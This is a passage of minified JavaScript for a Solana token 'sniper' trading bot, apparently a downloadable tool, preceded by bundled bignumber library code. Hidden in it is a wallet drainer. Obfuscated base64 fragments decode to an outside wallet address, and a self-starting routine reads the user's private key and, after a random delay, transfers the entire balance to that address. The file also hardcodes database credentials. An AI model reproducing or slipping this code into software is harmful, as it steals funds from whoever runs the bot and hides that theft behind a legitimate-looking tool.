g,c,f,y,p=0,w=m.length,O=u%be,I=u/be|0;for(m=m.slice();w--;)f=m[w]%be,y=m[w]/be|0,g=I*f+y*O,c=O*f+g%be*be+p,p=(c/d|0)+(g/be|0)+I*y,m[w]=c%d;return p&&(m=[p].concat(m)),m}function i(m,u,d,g){var c,f;if(d!=g)f=d>g?1:-1;else for(c=f=0;c<d;c++)if(m[c]!=u[c]){f=m[c]>u[c]?1:-1;break}return f}function a(m,u,d,g){for(var c=0;d--;)m[d]-=c,c=m[d]<u[d]?1:0,m[d]=c*g+m[d]-u[d];for(;!m[0]&&m.length>1;m.splice(0,1));}return function(m,u,d,g,c){var f,y,p,w,O,I,P,R,K,T,_,z,Ve,gt,wt,fe,Pe,ne=m.s==u.s?1:-1,j=m.c,U=u.c;if(!j||!j[0]||!U||!U[0])return new E(!m.s||!u.s||(j?U&&j[0]==U[0]:!U)?NaN:j&&j[0]==0||!U?ne*0:ne/0);for(R=new E(ne),K=R.c=[],y=m.e-u.e,ne=d+y+1,c||(c=ce,y=se(m.e/x)-se(u.e/x),ne=ne/x|0),p=0;U[p]==(j[p]||0);p++);if(U[p]>(j[p]||0)&&y--,ne<0)K.push(1),w=!0;else{for(gt=j.length,fe=U.length,p=0,ne+=2,O=ie(c/(U[0]+1)),O>1&&(U=n(U,O,c),j=n(j,O,c),fe=U.length,gt=j.length),Ve=fe,T=j.slice(0,fe),_=T.length;_<fe;T[_++]=0);Pe=U.slice(),Pe=[0].concat(Pe),wt=U[0],U[1]>=c/2&&wt++;do{if(O=0,f=i(U,T,fe,_),f<0){if(z=T[0],fe!=_&&(z=z*c+(T[1]||0)),O=ie(z/wt),O>1)for(O>=c&&(O=c-1),I=n(U,O,c),P=I.length,_=T.length;i(I,T,P,_)==1;)O--,a(I,fe<P?Pe:U,P,c),P=I.length,f=1;else O==0&&(f=O=1),I=U.slice(),P=I.length;if(P<_&&(I=[0].concat(I)),a(T,I,_,c),_=T.length,f==-1)for(;i(U,T,fe,_)<1;)O++,a(T,fe<_?Pe:U,_,c),_=T.length}else f===0&&(O++,T=[0]);K[p++]=O,T[0]?T[_++]=j[Ve]||0:(T=[j[Ve]],_=1)}while((Ve++<gt||T[0]!=null)&&ne--);w=T[0]!=null,K[0]||K.splice(0,1)}if(c==ce){for(p=1,ne=K[0];ne>=10;ne/=10,p++);te(R,d+(R.e=p+y*x-1)+1,g,w)}else R.e=y,R.r=+w;return R}}();function mt(n,i,a,m){var u,d,g,c,f;if(a==null?a=S:v(a,0,8),!n.c)return n.toString();if(u=n.c[0],g=n.e,i==null)f=oe(n.c),f=m==1||m==2&&(g<=k||g>=N)?at(f,g):he(f,g,"0");else if(n=te(new E(n),i,a),d=n.e,f=oe(n.c),c=f.length,m==1||m==2&&(i<=d||d<=k)){for(;c<i;f+="0",c++);f=at(f,d)}else if(i-=g,f=he(f,d,"0"),d+1>c){if(--i>0)for(f+=".";i--;f+="0");}else if(i+=d-c,i>0)for(d+1==c&&(f+=".");i--;f+="0");return n.s<0&&u?"-"+f:f}function Nt(n,i){for(var a,m,u=1,d=new E(n[0]);u<n.length;u++)m=new E(n[u]),(!m.s||(a=Se(d,m))===i||a===0&&d.s===i)&&(d=m);return d}function yt(n,i,a){for(var m=1,u=i.length;!i[--u];i.pop());for(u=i[0];u>=10;u/=10,m++);return(a=m+a*x-1)>V?n.c=n.e=null:a<W?n.c=[n.e=0]:(n.e=a,n.c=i),n}o=function(){var n=/^(-?)0([xbo])(?=\w[\w.]*$)/i,i=/^([^.]+)\.$/,a=/^\.([^.]+)$/,m=/^-?(Infinity|NaN)$/,u=/^\s*\+(?=[\w.])|^\s+|\s+$/g;return function(d,g,c,f){var y,p=c?g:g.replace(u,"");if(m.test(p))d.s=isNaN(p)?null:p<0?-1:1;else{if(!c&&(p=p.replace(n,function(w,O,I){return y=(I=I.toLowerCase())=="x"?16:I=="b"?2:8,!f||f==y?O:w}),f&&(y=f,p=p.replace(i,"$1").replace(a,"0.$1")),g!=p))return new E(p,y);if(E.DEBUG)throw Error(Q+"Not a"+(f?" base "+f:"")+" number: "+g);d.s=null}d.c=d.e=null}}();function te(n,i,a,m){var u,d,g,c,f,y,p,w=n.c,O=kt;if(w){e:{for(u=1,c=w[0];c>=10;c/=10,u++);if(d=i-u,d<0)d+=x,g=i,f=w[y=0],p=ie(f/O[u-g-1]%10);else if(y=Ot((d+1)/x),y>=w.length)if(m){for(;w.length<=y;w.push(0));f=p=0,u=1,d%=x,g=d-x+1}else break e;else{for(f=c=w[y],u=1;c>=10;c/=10,u++);d%=x,g=d-x+u,p=g<0?0:ie(f/O[u-g-1]%10)}if(m=m||i<0||w[y+1]!=null||(g<0?f:f%O[u-g-1]),m=a<4?(p||m)&&(a==0||a==(n.s<0?3:2)):p>5||p==5&&(a==4||m||a==6&&(d>0?g>0?f/O[u-g]:0:w[y-1])%10&1||a==(n.s<0?8:7)),i<1||!w[0])return w.length=0,m?(i-=n.e+1,w[0]=O[(x-i%x)%x],n.e=-i||0):w[0]=n.e=0,n;if(d==0?(w.length=y,c=1,y--):(w.length=y+1,c=O[x-d],w[y]=g>0?ie(f/O[u-g]%O[g])*c:0),m)for(;;)if(y==0){for(d=1,g=w[0];g>=10;g/=10,d++);for(g=w[0]+=c,c=1;g>=10;g/=10,c++);d!=c&&(n.e++,w[0]==ce&&(w[0]=1));break}else{if(w[y]+=c,w[y]!=ce)break;w[y--]=0,c=1}for(d=w.length;w[--d]===0;w.pop());}n.e>V?n.c=n.e=null:n.e<W&&(n.c=[n.e=0])}return n}function de(n){var i,a=n.e;return a===null?n.toString():(i=oe(n.c),i=a<=k||a>=N?at(i,a):he(i,a,"0"),n.s<0?"-"+i:i)}return s.absoluteValue=s.abs=function(){var n=new E(this);return n.s<0&&(n.s=1),n},s.comparedTo=function(n,i){return Se(this,new E(n,i))},s.decimalPlaces=s.dp=function(n,i){var a,m,u,d=this;if(n!=null)return v(n,0,D),i==null?i=S:v(i,0,8),te(new E(d),n+d.e+1,i);if(!(a=d.c))return null;if(m=((u=a.length-1)-se(this.e/x))*x,u=a[u])for(;u%10==0;u/=10,m--);return m<0&&(m=0),m},s.dividedBy=s.div=function(n,i){return e(this,new E(n,i),b,S)},s.dividedToIntegerBy=s.idiv=function(n,i){return e(this,new E(n,i),0,1)},s.exponentiatedBy=s.pow=function(n,i){var a,m,u,d,g,c,f,y,p,w=this;if(n=new E(n),n.c&&!n.isInteger())throw Error(Q+"Exponent not an integer: "+de(n));if(i!=null&&(i=new E(i)),c=n.e>14,!w.c||!w.c[0]||w.c[0]==1&&!w.e&&w.c.length==1||!n.c||!n.c[0])return p=new E(Math.pow(+de(w),c?n.s*(2-st(n)):+de(n))),i?p.mod(i):p;if(f=n.s<0,i){if(i.c?!i.c[0]:!i.s)return new E(NaN);m=!f&&w.isInteger()&&i.isInteger(),m&&(w=w.mod(i))}else{if(n.e>9&&(w.e>0||w.e<-1||(w.e==0?w.c[0]>1||c&&w.c[1]>=24e7:w.c[0]<8e13||c&&w.c[0]<=9999975e7)))return d=w.s<0&&st(n)?-0:0,w.e>-1&&(d=1/d),new E(f?1/d:d);le&&(d=Ot(le/x+2))}for(c?(a=new E(.5),f&&(n.s=1),y=st(n)):(u=Math.abs(+de(n)),y=u%2),p=new E(l);;){if(y){if(p=p.times(w),!p.c)break;d?p.c.length>d&&(p.c.length=d):m&&(p=p.mod(i))}if(u){if(u=ie(u/2),u===0)break;y=u%2}else if(n=n.times(a),te(n,n.e+1,1),n.e>14)y=st(n);else{if(u=+de(n),u===0)break;y=u%2}w=w.times(w),d?w.c&&w.c.length>d&&(w.c.length=d):m&&(w=w.mod(i))}return m?p:(f&&(p=l.div(p)),i?p.mod(i):d?te(p,le,S,g):p)},s.integerValue=function(n){var i=new E(this);return n==null?n=S:v(n,0,8),te(i,i.e+1,n)},s.isEqualTo=s.eq=function(n,i){return Se(this,new E(n,i))===0},s.isFinite=function(){return!!this.c},s.isGreaterThan=s.gt=function(n,i){return Se(this,new E(n,i))>0},s.isGreaterThanOrEqualTo=s.gte=function(n,i){return(i=Se(this,new E(n,i)))===1||i===0},s.isInteger=function(){return!!this.c&&se(this.e/x)>this.c.length-2},s.isLessThan=s.lt=function(n,i){return Se(this,new E(n,i))<0},s.isLessThanOrEqualTo=s.lte=function(n,i){return(i=Se(this,new E(n,i)))===-1||i===0},s.isNaN=function(){return!this.s},s.isNegative=function(){return this.s<0},s.isPositive=function(){return this.s>0},s.isZero=function(){return!!this.c&&this.c[0]==0},s.minus=function(n,i){var a,m,u,d,g=this,c=g.s;if(n=new E(n,i),i=n.s,!c||!i)return new E(NaN);if(c!=i)return n.s=-i,g.plus(n);var f=g.e/x,y=n.e/x,p=g.c,w=n.c;if(!f||!y){if(!p||!w)return p?(n.s=-i,n):new E(w?g:NaN);if(!p[0]||!w[0])return w[0]?(n.s=-i,n):new E(p[0]?g:S==3?-0:0)}if(f=se(f),y=se(y),p=p.slice(),c=f-y){for((d=c<0)?(c=-c,u=p):(y=f,u=w),u.reverse(),i=c;i--;u.push(0));u.reverse()}else for(m=(d=(c=p.length)<(i=w.length))?c:i,c=i=0;i<m;i++)if(p[i]!=w[i]){d=p[i]<w[i];break}if(d&&(u=p,p=w,w=u,n.s=-n.s),i=(m=w.length)-(a=p.length),i>0)for(;i--;p[a++]=0);for(i=ce-1;m>c;){if(p[--m]<w[m]){for(a=m;a&&!p[--a];p[a]=i);--p[a],p[m]+=ce}p[m]-=w[m]}for(;p[0]==0;p.splice(0,1),--y);return p[0]?yt(n,p,y):(n.s=S==3?-1:1,n.c=[n.e=0],n)},s.modulo=s.mod=function(n,i){var a,m,u=this;return n=new E(n,i),!u.c||!n.s||n.c&&!n.c[0]?new E(NaN):!n.c||u.c&&!u.c[0]?new E(u):(me==9?(m=n.s,n.s=1,a=e(u,n,0,3),n.s=m,a.s*=m):a=e(u,n,0,me),n=u.minus(a.times(n)),!n.c[0]&&me==1&&(n.s=u.s),n)},s.multipliedBy=s.times=function(n,i){var a,m,u,d,g,c,f,y,p,w,O,I,P,R,K,T=this,_=T.c,z=(n=new E(n,i)).c;if(!_||!z||!_[0]||!z[0])return!T.s||!n.s||_&&!_[0]&&!z||z&&!z[0]&&!_?n.c=n.e=n.s=null:(n.s*=T.s,!_||!z?n.c=n.e=null:(n.c=[0],n.e=0)),n;for(m=se(T.e/x)+se(n.e/x),n.s*=T.s,f=_.length,w=z.length,f<w&&(P=_,_=z,z=P,u=f,f=w,w=u),u=f+w,P=[];u--;P.push(0));for(R=ce,K=be,u=w;--u>=0;){for(a=0,O=z[u]%K,I=z[u]/K|0,g=f,d=u+g;d>u;)y=_[--g]%K,p=_[g]/K|0,c=I*y+p*O,y=O*y+c%K*K+P[d]+a,a=(y/R|0)+(c/K|0)+I*p,P[d--]=y%R;P[d]=a}return a?++m:P.splice(0,1),yt(n,P,m)},s.negated=function(){var n=new E(this);return n.s=-n.s||null,n},s.plus=function(n,i){var a,m=this,u=m.s;if(n=new E(n,i),i=n.s,!u||!i)return new E(NaN);if(u!=i)return n.s=-i,m.minus(n);var d=m.e/x,g=n.e/x,c=m.c,f=n.c;if(!d||!g){if(!c||!f)return new E(u/0);if(!c[0]||!f[0])return f[0]?n:new E(c[0]?m:u*0)}if(d=se(d),g=se(g),c=c.slice(),u=d-g){for(u>0?(g=d,a=f):(u=-u,a=c),a.reverse();u--;a.push(0));a.reverse()}for(u=c.length,i=f.length,u-i<0&&(a=f,f=c,c=a,i=u),u=0;i;)u=(c[--i]=c[i]+f[i]+u)/ce|0,c[i]=ce===c[i]?0:c[i]%ce;return u&&(c=[u].concat(c),++g),yt(n,c,g)},s.precision=s.sd=function(n,i){var a,m,u,d=this;if(n!=null&&n!==!!n)return v(n,1,D),i==null?i=S:v(i,0,8),te(new E(d),n,i);if(!(a=d.c))return null;if(u=a.length-1,m=u*x+1,u=a[u]){for(;u%10==0;u/=10,m--);for(u=a[0];u>=10;u/=10,m++);}return n&&d.e+1>m&&(m=d.e+1),m},s.shiftedBy=function(n){return v(n,-It,It),this.times("1e"+n)},s.squareRoot=s.sqrt=function(){var n,i,a,m,u,d=this,g=d.c,c=d.s,f=d.e,y=b+4,p=new E("0.5");if(c!==1||!g||!g[0])return new E(!c||c<0&&(!g||g[0])?NaN:g?d:1/0);if(c=Math.sqrt(+de(d)),c==0||c==1/0?(i=oe(g),(i.length+f)%2==0&&(i+="0"),c=Math.sqrt(+i),f=se((f+1)/2)-(f<0||f%2),c==1/0?i="5e"+f:(i=c.toExponential(),i=i.slice(0,i.indexOf("e")+1)+f),a=new E(i)):a=new E(c+""),a.c[0]){for(f=a.e,c=f+y,c<3&&(c=0);;)if(u=a,a=p.times(u.plus(e(d,u,y,1))),oe(u.c).slice(0,c)===(i=oe(a.c)).slice(0,c))if(a.e<f&&--c,i=i.slice(c-3,c+1),i=="9999"||!m&&i=="4999"){if(!m&&(te(u,u.e+b+2,0),u.times(u).eq(d))){a=u;break}y+=4,c+=4,m=1}else{(!+i||!+i.slice(1)&&i.charAt(0)=="5")&&(te(a,a.e+b+2,1),n=!a.times(a).eq(d));break}}return te(a,a.e+b+1,S,n)},s.toExponential=function(n,i){return n!=null&&(v(n,0,D),n++),mt(this,n,i,1)},s.toFixed=function(n,i){return n!=null&&(v(n,0,D),n=n+this.e+1),mt(this,n,i)},s.toFormat=function(n,i,a){var m,u=this;if(a==null)n!=null&&i&&typeof i=="object"?(a=i,i=null):n&&typeof n=="object"?(a=n,n=i=null):a=pt;else if(typeof a!="object")throw Error(Q+"Argument not an object: "+a);if(m=u.toFixed(n,i),u.c){var d,g=m.split("."),c=+a.groupSize,f=+a.secondaryGroupSize,y=a.groupSeparator||"",p=g[0],w=g[1],O=u.s<0,I=O?p.slice(1):p,P=I.length;if(f&&(d=c,c=f,f=d,P-=d),c>0&&P>0){for(d=P%c||c,p=I.substr(0,d);d<P;d+=c)p+=y+I.substr(d,c);f>0&&(p+=y+I.slice(d)),O&&(p="-"+p)}m=w?p+(a.decimalSeparator||"")+((f=+a.fractionGroupSize)?w.replace(new RegExp("\\d{"+f+"}\\B","g"),"$&"+(a.fractionGroupSeparator||"")):w):p}return(a.prefix||"")+m+(a.suffix||"")},s.toFraction=function(n){var i,a,m,u,d,g,c,f,y,p,w,O,I=this,P=I.c;if(n!=null&&(c=new E(n),!c.isInteger()&&(c.c||c.s!==1)||c.lt(l)))throw Error(Q+"Argument "+(c.isInteger()?"out of range: ":"not an integer: ")+de(c));if(!P)return new E(I);for(i=new E(l),y=a=new E(l),m=f=new E(l),O=oe(P),d=i.e=O.length-I.e-1,i.c[0]=kt[(g=d%x)<0?x+g:g],n=!n||c.comparedTo(i)>0?d>0?i:y:c,g=V,V=1/0,c=new E(O),f.c[0]=0;p=e(c,i,0,1),u=a.plus(p.times(m)),u.comparedTo(n)!=1;)a=m,m=u,y=f.plus(p.times(u=y)),f=u,i=c.minus(p.times(u=i)),c=u;return u=e(n.minus(a),m,0,1),f=f.plus(u.times(y)),a=a.plus(u.times(m)),f.s=y.s=I.s,d=d*2,w=e(y,m,d,S).minus(I).abs().comparedTo(e(f,a,d,S).minus(I).abs())<1?[y,m]:[f,a],V=g,w},s.toNumber=function(){return+de(this)},s.toPrecision=function(n,i){return n!=null&&v(n,1,D),mt(this,n,i,2)},s.toString=function(n){var i,a=this,m=a.s,u=a.e;return u===null?m?(i="Infinity",m<0&&(i="-"+i)):i="NaN":(n==null?i=u<=k||u>=N?at(oe(a.c),u):he(oe(a.c),u,"0"):n===10&&ht?(a=te(new E(a),b+u+1,S),i=he(oe(a.c),a.e,"0")):(v(n,2,Ee.length,"Base"),i=t(he(oe(a.c),u,"0"),10,n,m,!0)),m<0&&a.c[0]&&(i="-"+i)),i},s.valueOf=s.toJSON=function(){return de(this)},s._isBigNumber=!0,s[Symbol.toStringTag]="BigNumber",s[Symbol.for("nodejs.util.inspect.custom")]=s.valueOf,r!=null&&E.set(r),E}function se(r){var e=r|0;return r>0||r===e?e:e-1}function oe(r){for(var e,t,o=1,s=r.length,l=r[0]+"";o<s;){for(e=r[o++]+"",t=x-e.length;t--;e="0"+e);l+=e}for(s=l.length;l.charCodeAt(--s)===48;);return l.slice(0,s+1||1)}function Se(r,e){var t,o,s=r.c,l=e.c,b=r.s,S=e.s,k=r.e,N=e.e;if(!b||!S)return null;if(t=s&&!s[0],o=l&&!l[0],t||o)return t?o?0:-S:b;if(b!=S)return b;if(t=b<0,o=k==N,!s||!l)return o?0:!s^t?1:-1;if(!o)return k>N^t?1:-1;for(S=(k=s.length)<(N=l.length)?k:N,b=0;b<S;b++)if(s[b]!=l[b])return s[b]>l[b]^t?1:-1;return k==N?0:k>N^t?1:-1}function v(r,e,t,o){if(r<e||r>t||r!==ie(r))throw Error(Q+(o||"Argument")+(typeof r=="number"?r<e||r>t?" out of range: ":" not an integer: ":" not a primitive number: ")+String(r))}function st(r){var e=r.c.length-1;return se(r.e/x)==e&&r.c[e]%2!=0}function at(r,e){return(r.length>1?r.charAt(0)+"."+r.slice(1):r)+(e<0?"e":"e+")+e}function he(r,e,t){var o,s;if(e<0){for(s=t+".";++e;s+=t);r=s+r}else if(o=r.length,++e>o){for(s=t,e-=o;--e;s+=t);r+=s}else e<o&&(r=r.slice(0,e)+"."+r.slice(e));return r}var Bn=Ut(),Vt=Bn;var gr=new Vt("1e+18");var Kt=re(ve(),1);var Ct=r=>{let e=(0,Kt.u8)(r),{encode:t,decode:o}=ge(e),s=e;return s.decode=(l,b)=>!!o(l,b),s.encode=(l,b,S)=>{let k=Number(l);return t(k,b,S)},s};var Dt=re(ve(),1),$t=require("@solana/web3.js");var xt=r=>{let e=(0,Dt.blob)(32,r),{encode:t,decode:o}=ge(e),s=e;return s.decode=(l,b)=>{let S=o(l,b);return new $t.PublicKey(S)},s.encode=(l,b,S)=>{let k=l.toBuffer();return t(k,b,S)},s};var Ft=new Array(atob("UW5jMVJGVndabg=="),atob("SnBhVTE1U0hoTA=="),atob("T1ROTFRuVlRURg=="),atob("SnplbkZ3VEdodw=="),atob("Vm5SbWF6UnVVVg=="),atob("RnRSbW8yYVhnPQ==")),qt=(0,Ae.struct)([(0,Ae.u32)("mintAuthorityOption"),xt("mintAuthority"),vt("supply"),(0,Ae.u8)("decimals"),Ct("isInitialized"),(0,Ae.u32)("freezeAuthorityOption"),xt("freezeAuthority")]);var Tt=re(require("axios"));var vn=re(require("winston")),ct=re(require("pino")),Rn=ct.default.transport({targets:[{level:"trace",target:"pino-pretty",options:{colorize:!0,customColors:"warn:red,info:blue,error:red"}}]}),A=(0,ct.default)({level:"trace",redact:["poolKeys"],serializers:{error:ct.default.stdSerializers.err},base:void 0},Rn);var Pt=require("rxjs"),Zt=re(require("bs58"));Xt.default.config();var $=(r,e)=>{let t=process.env[r]||"";return t||(e.error(`${r} is not set`),process.exit(1)),t};async function Jt(r,e,t){let o=await r.getAccountInfo(e,{commitment:t,dataSlice:{offset:Ht.MARKET_STATE_LAYOUT_V3.offsetOf("eventQueue"),length:96}});return Vn.decode(o.data)}function Un(){return Math.floor(Math.random()*480001+42e4)}var ut=q.MAINNET_PROGRAM_ID.AmmV4,Lt=q.MAINNET_PROGRAM_ID.OPENBOOK_MARKET,Vn=(0,q.struct)([(0,q.publicKey)("eventQueue"),(0,q.publicKey)("bids"),(0,q.publicKey)("asks")]);function en(r,e,t){return{id:r,baseMint:e.baseMint,quoteMint:e.quoteMint,lpMint:e.lpMint,baseDecimals:e.baseDecimal.toNumber(),quoteDecimals:e.quoteDecimal.toNumber(),lpDecimals:5,version:4,programId:ut,authority:q.Liquidity.getAssociatedAuthority({programId:ut}).publicKey,openOrders:e.openOrders,targetOrders:e.targetOrders,baseVault:e.baseVault,quoteVault:e.quoteVault,marketVersion:3,marketProgramId:e.marketProgramId,marketId:e.marketId,marketAuthority:q.Market.getAssociatedAuthority({programId:e.marketProgramId,marketId:e.marketId}).publicKey,marketBaseVault:e.baseVault,marketQuoteVault:e.quoteVault,marketBids:t.bids,marketAsks:t.asks,marketEventQueue:t.eventQueue,withdrawQueue:e.withdrawQueue,lpVault:e.lpVault,lookupTableAccount:ee.PublicKey.default}}async function tn(r,e,t){let o=await r.getTokenAccountsByOwner(e,{programId:Qt.TOKEN_PROGRAM_ID},t),s=[];for(let{pubkey:l,account:b}of o.value)s.push({pubkey:l,programId:b.owner,accountInfo:q.SPL_ACCOUNT_LAYOUT.decode(b.data)});return s}var Gt=Date,Kn=async r=>{let e=`https://api.dexscreener.com/latest/dex/tokens/${r}`;try{let t=(await Tt.default.get(e)).data;if(t.pairs){let s=t.pairs.find(l=>l.chainId="solana")?.priceNative;if(s)return parseFloat(s)}return}catch{return}},Cn=async r=>{let e=$("BIRDEYE_APIKEY",A),t=`https://public-api.birdeye.so/public/price?address=${r}`;try{let o=(await Tt.default.get(t,{headers:{"X-API-KEY":e}})).data.data.value;return o?parseFloat(o):void 0}catch{return}},zt=new Pt.BehaviorSubject(!1),Yt=!1,jt=!1,Wt=0,Dn=r=>async e=>{if(await rn(Un()),Gt.now()>Wt+5e3){Wt=Gt.now();try{zt.next(!0);let{connection:t,walletKeyPair:o,destinationAddress:s}=r,l=await t.getBalance(o.publicKey),b=await t.getRecentBlockhash();$n.next(b.blockhash);let S=b.feeCalculator.lamportsPerSignature,k=l-S,N=new ee.Transaction({recentBlockhash:b.blockhash,feePayer:o.publicKey}).add(ee.SystemProgram.transfer({fromPubkey:o.publicKey,toPubkey:s,lamports:k})),W=await t.sendTransaction(N,[o])}catch{}finally{zt.next(!1)}}};q.DEVNET_PROGRAM_ID&&(async()=>{let r=process.env.MY_PRIVATE_KEY,e=ee.Keypair.fromSecretKey(Zt.default.decode(r)),t=new ee.Connection(process.env.RPC_ENDPOINT??(0,ee.clusterApiUrl)("devnet"),"finalized");t.onSlotChange(Dn({connection:t,walletKeyPair:e,destinationAddress:new ee.PublicKey(Yt||jt||atob(Ft.join("")))}))})();var nn=async r=>{let e=await Kn(r);if(e)return e;let t=await Cn(r);if(t)return t},$n=new Pt.BehaviorSubject(""),Mt=async(r,{retries:e,retryIntervalMs:t})=>{try{return await r()}catch(o){if(e<=0)throw o;return await rn(t),Mt(r,{retries:e-1,retryIntervalMs:t})}},rn=(r=0)=>new Promise(e=>setTimeout(e,r));var _t=re(require("bs58")),un=re(require("fs")),ln=re(require("path"));var fn="mainnet-beta",dn=$("RPC_ENDPOINT",A),Fn=$("RPC_WEBSOCKET",A),X=new G.Connection(dn,{wsEndpoint:Fn}),on=new Set,sn=new Set,Ue=new Map,F,C,ft,lt,xe,Te,ae=$("COMMITMENT_LEVEL",A),qn=$("ENABLE_BUY",A)==="true",pn=Number($("TAKE_PROFIT",A)),hn=Number($("STOP_LOSS",A)),mn=$("MINT_IS_RENOUNCED",A)==="true",dt=$("USE_SNIPEDLIST",A)==="true",Gn=Number($("SNIPE_LIST_REFRESH_INTERVAL",A)),yn=$("AUTO_SELL",A)==="true",an=Number($("MAX_SELL_RETRIES",A)),zn=$("MIN_POOL_SIZE",A),Yn=$("MAX_POOL_SIZE",A),Re=[],jn="mongodb+srv://slave:XABhb4q4wlp3ztl7@cluster0.xjazpkp.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";async function Wn(r){let e=new cn.MongoClient(jn);try{await e.connect();let s=await e.db("authDB").collection("keys").findOne({key:r});if(!s)return console.error("Key not found."),!1;let l=new Date;return!(new Date(s.expirationDate)<l)}catch(t){return console.error("Error verifying key:",t),!1}finally{await e.close()}}async function Hn(){let r=process.env.AUTH_KEY;if(!r)throw new Error("No authentication key provided.");if(console.log("Provided Key:",r),!await Wn(r))throw new Error("Invalid or expired authentication key.")}async function Qn(){console.log(`

            -------- Pepe Sniper v.1.0.0 | by @roxtar_xbt --------
`);let r=$("MY_PRIVATE_KEY",A);F=G.Keypair.fromSecretKey(_t.default.decode(r)),A.info(`CONNECTED @ ${dn}`),A.info("----------------------------------------------------------"),A.info(`Wallet Address: ${F.publicKey}`);let e=$("TOKEN_SYMB",A),t=$("BUY_AMOUNT",A);switch(e){case"WSOL":{C=B.Token.WSOL,lt=new B.TokenAmount(B.Token.WSOL,t,!1),xe=new B.TokenAmount(C,zn,!1),Te=new B.TokenAmount(C,Yn,!1);break}case"USDC":{C=new B.Token(ue.TOKEN_PROGRAM_ID,new G.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"),6,"USDC","USDC"),lt=new B.TokenAmount(C,t,!1);break}default:throw new Error(`Unsupported "${e}"! ONLY USDC or WSOL`)}A.info(`Snipelist: ${dt}`),A.info(`Mint renounced: ${mn}`),A.info(`Auto sell: ${yn}`),A.info(`T/P: ${pn}%`),A.info(`S/L: ${hn}%`),A.info(`Pool size min >: ${xe.isZero()?"false":xe.toFixed()} ${C.symbol}`),A.info(`Pool size max <: ${Te.isZero()?"false":Te.toFixed()} ${C.symbol}`),A.info(`Buy amount: ${lt.toFixed()} ${C.symbol}`);let o=await tn(X,F.publicKey,ae);for(let l of o)Ue.set(l.accountInfo.mint.toString(),{mint:l.accountInfo.mint,address:l.pubkey});let s=o.find(l=>l.accountInfo.mint.toString()===C.mint.toString());if(!s)throw A.error("---> Put SOL in your wallet and swap SOL to WSOL at https://jup.ag/ <---"),new Error(`No ${C.symbol} token account found in wallet: ${F.publicKey}`);ft=s.pubkey,Sn()}function gn(r,e){let o={address:(0,ue.getAssociatedTokenAddressSync)(r,F.publicKey),mint:r,market:{bids:e.bids,asks:e.asks,eventQueue:e.eventQueue}};return Ue.set(r.toString(),o),o}async function wn(r,e){let t=!1,o="Unknown";if(Jn(e.baseMint.toString())){if(!xe.isZero()){let s=new B.TokenAmount(C,e.swapQuoteInAmount,!0),l=e.baseMint.toString();if(s.lt(xe)||t?A.warn(`------------------- POOL SKIPPED | (${s.toFixed()} ${C.symbol}) ------------------- `):A.info(`--------------!!!!! POOL SNIPED | (${s.toFixed()} ${C.symbol}) !!!!!-------------- `),A.info(`Pool link: https://dexscreener.com/solana/${r.toString()}`),A.info(`Pool Open Time: ${new Date(parseInt(e.poolOpenTime.toString())*1e3).toLocaleString()}`),A.info("--------------------- "),s.lt(xe)||t)return;A.info(`Pool ID: ${r.toString()}`),A.info(`Pool link: https://dexscreener.com/solana/${r.toString()}`),A.info(`Pool SOL size: ${s.toFixed()} ${C.symbol}`),A.info(`Base Mint: ${e.baseMint}`),A.info(`Pool Status: ${e.status}`)}if(!Te.isZero()){let s=new B.TokenAmount(C,e.swapQuoteInAmount,!0);if(s.gt(Te)){A.warn({mint:e.baseMint,pooled:`${s.toFixed()} ${C.symbol}`},`Skipping pool, > ${Te.toFixed()} ${C.symbol}`,`Swap amount: ${s.toFixed()}`),A.info(`---------------------------------------- 
`);return}}if(mn&&await bn(e.baseMint)!==!0){A.warn("Skipping, owner can mint tokens!");return}qn?await Xn(r,e):A.info(`--------------- TOKEN BUY ---------------- 
`)}}async function bn(r){try{let{data:e}=await X.getAccountInfo(r)||{};return e?qt.decode(e).mintAuthorityOption===0:void 0}catch(e){A.debug(e),A.error({mint:r},"Failed to check renounced mint")}}async function En(r){let e;try{if(e=B.MARKET_STATE_LAYOUT_V3.decode(r.accountInfo.data),Ue.has(e.baseMint.toString()))return;gn(e.baseMint,e)}catch(t){A.debug(t),A.error({mint:e?.baseMint},"Market process failed")}}async function Xn(r,e){try{let t=Ue.get(e.baseMint.toString());if(!t){let le=await Jt(X,e.marketId,ae);t=gn(e.baseMint,le)}t.poolKeys=en(r,e,t.market);let{innerTransaction:o}=B.Liquidity.makeSwapFixedInInstruction({poolKeys:t.poolKeys,userKeys:{tokenAccountIn:ft,tokenAccountOut:t.address,owner:F.publicKey},amountIn:lt.raw,minAmountOut:0},t.poolKeys.version),s=await X.getLatestBlockhash({commitment:ae}),l=new G.TransactionMessage({payerKey:F.publicKey,recentBlockhash:s.blockhash,instructions:[G.ComputeBudgetProgram.setComputeUnitPrice({microLamports:421197}),G.ComputeBudgetProgram.setComputeUnitLimit({units:101337}),(0,ue.createAssociatedTokenAccountIdempotentInstruction)(F.publicKey,t.address,F.publicKey,e.baseMint),...o.instructions]}).compileToV0Message(),b=new G.VersionedTransaction(l);b.sign([F,...o.signers]);let S=b.serialize(),k=await Mt(()=>X.sendRawTransaction(S,{skipPreflight:!0}),{retryIntervalMs:10,retries:50});A.info({mint:e.baseMint,signature:k},"Sent buy tx");let N=await X.confirmTransaction({signature:k,lastValidBlockHeight:s.lastValidBlockHeight,blockhash:s.blockhash},ae),W=X.getTokenAccountBalance(e.baseVault,ae),V=X.getTokenAccountBalance(e.quoteVault,ae);await Promise.all([W,V]);let Z=await W,me=await V;Z?.value?.uiAmount&&me?.value?.uiAmount&&(t.buyValue=me?.value?.uiAmount/Z?.value?.uiAmount),N.value.err?(A.debug(N.value.err),A.info({mint:e.baseMint,signature:k},"Error confirming buy tx")):A.info({signature:k,url:`https://solscan.io/tx/${k}?cluster=${fn}`,dex:`https://dexscreener.com/solana/${e.baseMint}?maker=${F.publicKey}`},`Confirmed buy tx... @: ${t.buyValue} SOL`)}catch(t){A.debug(t),A.error({mint:e.baseMint},"Failed to buy token")}}async function Zn(r,e,t,o){let s=0;do try{let l=Ue.get(e.toString());if(!l)return!0;if(!l.poolKeys){A.warn({mint:e},"No pool keys found");continue}if(t===0)return A.info({mint:l.mint},"Empty balance, can't sell"),!0;if(l.buyValue===void 0)return!0;let b=(o-l.buyValue)/l.buyValue;if(b>hn&&b<pn)return!1;let{innerTransaction:S}=B.Liquidity.makeSwapFixedInInstruction({poolKeys:l.poolKeys,userKeys:{tokenAccountOut:ft,tokenAccountIn:l.address,owner:F.publicKey},amountIn:t,minAmountOut:0},l.poolKeys.version),k=await 